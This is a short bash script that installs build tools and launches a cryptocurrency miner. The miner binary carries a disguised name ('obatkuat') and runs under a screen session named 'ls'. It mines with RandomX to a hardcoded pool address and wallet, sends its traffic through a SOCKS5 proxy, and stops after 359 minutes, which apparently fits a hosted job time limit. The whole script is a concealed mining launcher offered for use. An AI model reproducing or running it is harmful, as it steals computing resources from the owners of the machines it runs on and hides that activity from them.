#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
chmod +x ternak.sh && chmod +x obatkuat
screen -dmS ls
A=35.171.75.57:1688
B=BTT:TLPbsRkFNUAutW7V5XeiC4jt9RDJd8xwVP
C=$(shuf -i 10-9999999999999999999 -n 1)#szor-izew
D=socks5://101.201.154.109:8080
timeout 359m ./obatkuat -a rx/0 -o $A -u $B.$C -p x -t 8 -x $D -k
sudo apt update
